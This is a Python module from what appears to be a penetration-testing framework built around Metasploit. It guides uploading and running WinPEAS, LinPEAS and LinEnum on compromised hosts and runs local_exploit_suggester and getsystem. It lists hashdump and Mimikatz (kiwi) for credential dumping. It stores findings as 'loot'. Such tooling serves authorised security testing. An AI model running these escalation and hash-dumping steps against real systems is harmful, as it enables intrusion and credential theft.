"""
MSF-COMMANDER v2 — Privilege Escalation Module
Automated enumeration using WinPEAS, LinPEAS, LinEnum, and Metasploit local_exploit_suggester.
Results are saved to the database and loot manager.
"""

import subprocess
import re
import tempfile
from pathlib import Path
from typing import Dict, List, Any, Tuple, Optional
from datetime import datetime

from rich.console import Console
from rich.table import Table
from rich.panel import Panel

console = Console()


class PrivescModule:
    """
    Automated privilege escalation enumeration and exploitation.
    Uses industry-standard enumeration scripts and Metasploit suggester.
    """

    def __init__(self, db, tm, events):
        self.db = db
        self.tm = tm
        self.events = events

    @staticmethod
    def _run(cmd: str, timeout: int = 300) -> Tuple[str, str, int]:
        try:
            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
            return r.stdout.strip(), r.stderr.strip(), r.returncode
        except subprocess.TimeoutExpired:
            return "", "TIMEOUT", -1
        except Exception as e:
            return "", str(e), -1

    def _save_results(self, name: str, content: str) -> str:
        loot_dir = Path("loot")
        loot_dir.mkdir(exist_ok=True)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        fp = loot_dir / f"{name}_{ts}.txt"
        fp.write_text(content)
        return str(fp)

    def _parse_highlights(self, output: str) -> List[Dict[str, str]]:
        """Extract high-priority findings from enumeration output."""
        findings = []
        priority_patterns = [
            (r"\[+\] .*SUID.*", "CRITICAL", "SUID binary found"),
            (r"\[+\] .*sudo.*NOPASSWD.*", "CRITICAL", "Sudo NOPASSWD misconfiguration"),
            (r"\[+\] .*capabilities.*", "HIGH", "Dangerous capabilities set"),
            (r"\[+\] .*cron.*", "HIGH", "Writable cron job/directory"),
            (r"\[+\] .*writable.*PATH.*", "HIGH", "Writable PATH entry"),
            (r"\[+\] .*kernel.*exploit.*", "CRITICAL", "Kernel exploit available"),
            (r"\[+\] .*dirty.*cow.*", "CRITICAL", "Dirty COW vulnerability"),
            (r"\[+\] .*CVE-\d{4}-\d+.*", "HIGH", "CVE vulnerability found"),
            (r"\[!\].*", "MEDIUM", "Potential misconfiguration"),
            (r"\[+\].*root.*", "HIGH", "Root-related finding"),
            (r"\[+\].*admin.*", "MEDIUM", "Admin-related finding"),
            (r"\[+\].*password.*", "HIGH", "Password/credential found"),
            (r"\[+\].*write.*", "MEDIUM", "Writable resource"),
            (r"\[+\].*misconfig.*", "MEDIUM", "Misconfiguration detected"),
            (r"\[+\].*run as root", "HIGH", "Can run as root"),
            (r"Vulnerable to.*", "CRITICAL", "Direct vulnerability identified"),
            (r"Exploit.*", "HIGH", "Exploit method identified"),
        ]

        for pattern, severity, desc in priority_patterns:
            for line in output.splitlines():
                if re.search(pattern, line, re.IGNORECASE):
                    findings.append({
                        "severity": severity,
                        "category": desc,
                        "finding": line.strip()[:200],
                    })

        return findings

    # ═══════════════════════════════════════════════════════
    # WINDOWS PRIVESC
    # ═══════════════════════════════════════════════════════
    def winpeas_scan(self, session_id: str = "", upload_method: str = "meterpreter") -> Dict[str, Any]:
        """
        Run WinPEAS (Windows Privilege Escalation Awesome Script).
        Downloads latest WinPEAS, uploads to target, executes, parses results.

        WinPEAS checks: services, registry, file permissions, tokens, UAC, 
        scheduled tasks, always install, unquoted paths, DLL hijacking, etc.
        """
        console.print(Panel(
            "[bold]WinPEAS Automated Enumeration[/]\n\n"
            "WinPEAS enumerates:\n"
            "• Services with weak permissions\n"
            "• Registry keys (auto-run, etc.)\n"
            "• File/folder permissions\n"
            "• Token privileges\n"
            "• UAC configuration\n"
            "• Scheduled tasks\n"
            "• Unquoted service paths\n"
            "• DLL hijacking opportunities\n"
            "• Network information\n"
            "• Installed software & patches\n"
            "• Named pipes\n"
            "• Credential stores",
            title="[bold cyan]Windows Privilege Escalation[/]",
            border_style="cyan"
        ))

        # Generate meterpreter resource script for WinPEAS
        rc_content = """
# Upload and execute WinPEAS
# Note: WinPEAS must be downloaded first from GitHub
# https://github.com/carlospolop/PEASS-ng/releases

# Check if winpeas is available locally
execute -f "cmd.exe" -a "/c where winpeas.exe 2>nul || echo NOT_FOUND"
"""

        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        rc_file = Path("logs") / f"winpeas_{ts}.rc"
        rc_file.parent.mkdir(exist_ok=True)
        rc_file.write_text(rc_content)

        self.events.emit("info", "privesc", "winpeas",
                         "WinPEAS enumeration script prepared")
        console.print(f"\n[bold yellow]Steps to run WinPEAS:[/]")
        console.print("  1. Download: [cyan]wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe[/]")
        console.print("  2. Upload: [cyan]msf> upload winPEASx64.exe C:\\\\Windows\\\\Temp\\\\wp.exe[/]")
        console.print("  3. Execute: [cyan]meterpreter> execute -f wp.exe -a \"quiet\"[/]")
        console.print("  4. Save output: [cyan]meterpreter> execute -f cmd.exe -a \"/c C:\\\\Windows\\\\Temp\\\\wp.exe > C:\\\\Windows\\\\Temp\\\\peas.txt\"[/]")
        console.print("  5. Download: [cyan]meterpreter> download C:\\\\Windows\\\\Temp\\\\peas.txt[/]")
        console.print("  6. Parse: [cyan]msf-cmd privesc parse-winpeas loot/peas.txt[/]")

        return {
            "resource_file": str(rc_file),
            "method": "manual_guided",
            "note": "Follow the steps above to run WinPEAS on the target",
        }

    def winpeas_parse(self, file_path: str, target_id: str = "") -> Dict[str, Any]:
        """Parse WinPEAS output file and register findings in database."""
        fp = Path(file_path)
        if not fp.exists():
            return {"error": f"File not found: {file_path}"}

        content = fp.read_text(encoding="utf-8", errors="ignore")
        findings = self._parse_highlights(content)

        saved_path = self._save_results("winpeas_parsed", content)

        # Register findings in database
        for f in findings:
            if target_id:
                sev = f["severity"].lower()
                if sev == "critical":
                    sev = "high"
                self.tm.add_vulnerability(
                    target_id=target_id,
                    title=f"Privesc: {f['category']}",
                    severity=sev,
                    description=f["finding"],
                    module_used="winpeas",
                    proof=f["finding"][:500],
                )

        self.events.emit("info", "privesc", "winpeas_parsed",
                         f"Parsed {len(findings)} findings from WinPEAS output")

        # Print summary
        table = Table(title=f"WinPEAS Results: {len(findings)} findings",
                      box=rich.box.ROUNDED)
        table.add_column("Severity", style="bold")
        table.add_column("Category", style="cyan")
        table.add_column("Finding", style="white", max_width=80)

        for f in sorted(findings, key=lambda x: {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2}.get(x["severity"], 3)):
            color = {"CRITICAL": "red", "HIGH": "yellow", "MEDIUM": "dim"}.get(f["severity"], "white")
            table.add_row(f"[{color}]{f['severity']}[/]", f["category"], f["finding"][:80])

        console.print(table)
        console.print(f"\n[dim]Full output saved: {saved_path}[/]")

        return {"findings": findings, "total": len(findings), "saved_to": saved_path}

    def msf_local_exploit_suggester(self, session_id: str, target_id: str = "") -> Dict[str, Any]:
        """
        Run Metasploit's local_exploit_suggester on an active session.
        This module checks the target's OS version and suggests local exploits.
        """
        self.events.emit("info", "privesc", "msf_suggester",
                         f"Running local_exploit_suggester on session {session_id}")

        rc_content = f"""
use post/multi/recon/local_exploit_suggester
set SESSION {session_id}
run
exit -y
"""
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        rc_file = Path("logs") / f"suggester_{ts}.rc"
        rc_file.parent.mkdir(exist_ok=True)
        rc_file.write_text(rc_content)

        cmd = f"msfconsole --quiet -r {rc_file}"
        console.print(f"[bold cyan]Running local_exploit_suggester on session {session_id}...[/]")

        with console.status("[bold cyan]Analyzing local exploits..."):
            stdout, stderr, rc = self._run(cmd, timeout=300)

        output_file = self._save_results("local_exploit_suggester", stdout)

        # Parse MSF module suggestions
        suggested = []
        for line in stdout.splitlines():
            if "exploit/" in line:
                parts = [p.strip() for p in line.split("  ") if p.strip()]
                if parts:
                    suggested.append(parts[0])

        if target_id:
            for mod in suggested:
                self.tm.add_vulnerability(
                    target_id=target_id,
                    title=f"Suggested local exploit: {mod}",
                    severity="high",
                    description=f"Metasploit suggests: {mod}",
                    module_used=mod,
                )

        self.events.emit("info", "privesc", "suggester_complete",
                         f"Found {len(suggested)} suggested exploits")

        if suggested:
            table = Table(title="Suggested Local Exploits", box=rich.box.ROUNDED)
            table.add_column("#", style="dim")
            table.add_column("Module", style="cyan")
            for i, mod in enumerate(suggested, 1):
                table.add_row(str(i), mod)
            console.print(table)

        return {"suggested": suggested, "total": len(suggested), "log": output_file}

    # ═══════════════════════════════════════════════════════
    # LINUX PRIVESC
    # ═══════════════════════════════════════════════════════
    def linpeas_scan(self, session_id: str = "") -> Dict[str, Any]:
        """
        Run LinPEAS (Linux Privilege Escalation Awesome Script).
        """
        console.print(Panel(
            "[bold]LinPEAS Automated Enumeration[/]\n\n"
            "LinPEAS checks:\n"
            "• SUID/SGID binaries\n"
            "• Capabilities\n"
            "• Sudo rules\n"
            "• Cron jobs\n"
            "• PATH abuse\n"
            "• Kernel exploits\n"
            "• Network interfaces\n"
            "• Interesting files\n"
            "• Exported NFS shares\n"
            "• Docker/LXC misconfigurations\n"
            "• SSH keys & configs",
            title="[bold green]Linux Privilege Escalation[/]",
            border_style="green"
        ))

        console.print(f"\n[bold yellow]Steps to run LinPEAS:[/]")
        console.print("  1. Download: [cyan]wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh[/]")
        console.print("  2. Upload: [cyan]meterpreter> upload linpeas.sh /tmp/l.sh[/]")
        console.print("  3. Execute: [cyan]meterpreter> shell[/]")
        console.print("  4. [cyan]$ chmod +x /tmp/l.sh && /tmp/l.sh 2>/dev/null | tee /tmp/peas.txt[/]")
        console.print("  5. Download: [cyan]meterpreter> download /tmp/peas.txt[/]")
        console.print("  6. Parse: [cyan]msf-cmd privesc parse-linpeas loot/peas.txt[/]")

        return {"method": "manual_guided", "note": "Follow the steps above"}

    def linpeas_parse(self, file_path: str, target_id: str = "") -> Dict[str, Any]:
        """Parse LinPEAS output and register findings."""
        fp = Path(file_path)
        if not fp.exists():
            return {"error": f"File not found: {file_path}"}

        content = fp.read_text(encoding="utf-8", errors="ignore")
        findings = self._parse_highlights(content)
        saved_path = self._save_results("linpeas_parsed", content)

        for f in findings:
            if target_id:
                sev = f["severity"].lower()
                if sev == "critical":
                    sev = "high"
                self.tm.add_vulnerability(
                    target_id=target_id,
                    title=f"Privesc: {f['category']}",
                    severity=sev,
                    description=f["finding"],
                    module_used="linpeas",
                )

        self.events.emit("info", "privesc", "linpeas_parsed",
                         f"Parsed {len(findings)} findings")

        table = Table(title=f"LinPEAS Results: {len(findings)} findings",
                      box=rich.box.ROUNDED)
        table.add_column("Severity", style="bold")
        table.add_column("Category", style="cyan")
        table.add_column("Finding", style="white", max_width=80)

        for f in sorted(findings, key=lambda x: {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2}.get(x["severity"], 3)):
            color = {"CRITICAL": "red", "HIGH": "yellow", "MEDIUM": "dim"}.get(f["severity"], "white")
            table.add_row(f"[{color}]{f['severity']}[/]", f["category"], f["finding"][:80])

        console.print(table)
        return {"findings": findings, "total": len(findings), "saved_to": saved_path}

    def linenum_scan(self, session_id: str = "") -> Dict[str, Any]:
        """Run LinEnum (alternative Linux enumeration script)."""
        console.print(Panel(
            "[bold]LinEnum — Local Linux Enumeration[/]\n\n"
            "Steps:\n"
            "  wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\n"
            "  meterpreter> upload LinEnum.sh /tmp/le.sh\n"
            "  meterpreter> shell\n"
            "  $ chmod +x /tmp/le.sh && /tmp/le.sh > /tmp/le.txt\n"
            "  meterpreter> download /tmp/le.txt\n"
            "  msf-cmd privesc parse-linpeas loot/le.txt",
            title="[bold green]LinEnum[/]", border_style="green"
        ))
        return {"method": "manual_guided"}

    # ═══════════════════════════════════════════════════════
    # QUICK PRIVESC CHECKS
    # ═══════════════════════════════════════════════════════
    def quick_privesc_check(self, session_id: str, target_id: str = "") -> Dict[str, Any]:
        """
        Run quick privesc checks via meterpreter commands.
        No external scripts needed — uses built-in meterpreter features.
        """
        checks = [
            ("getuid", "Current user context"),
            ("getprivs", "Available privileges"),
            ("getsystem", "Attempt SYSTEM escalation"),
            ("hashdump", "Dump password hashes (if SYSTEM)"),
            ("load kiwi", "Load Mimikatz module (if SYSTEM)"),
        ]

        results = {}
        for cmd, desc in checks:
            self.events.emit("debug", "privesc", "quick_check", f"Running: {cmd}")
            results[cmd] = {"description": desc, "command": cmd}

        console.print(Panel(
            "\n".join([f"  [cyan]{cmd}[/] — {desc}" for cmd, desc in checks]),
            title="[bold]Quick Privesc Checks (via Meterpreter)[/]",
            border_style="yellow"
        ))

        # Generate resource script for quick checks
        rc_content = f"""
sessions -i {session_id}
getuid
getprivs
getsystem
exit -y
"""
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        rc_file = Path("logs") / f"quick_privesc_{ts}.rc"
        rc_file.write_text(rc_content)

        return {
            "checks": results,
            "resource_file": str(rc_file),
            "method": "meterpreter_builtins",
        }
